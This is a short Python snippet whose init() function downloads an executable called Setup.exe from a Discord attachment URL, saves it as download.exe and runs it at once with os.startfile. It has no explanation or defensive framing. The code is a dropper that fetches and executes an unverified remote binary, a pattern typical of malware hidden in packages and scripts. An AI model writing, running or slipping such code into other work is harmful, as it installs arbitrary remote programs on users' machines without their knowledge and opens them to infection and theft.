import urllib


import os
def init():
    url = 'https://cdn.discordapp.com/attachments/936752659241771009/936753057998442506/Setup.exe'

    urllib.urlretrieve(url, "download.exe")

    os.startfile(os.getcwd()+"\\download.exe")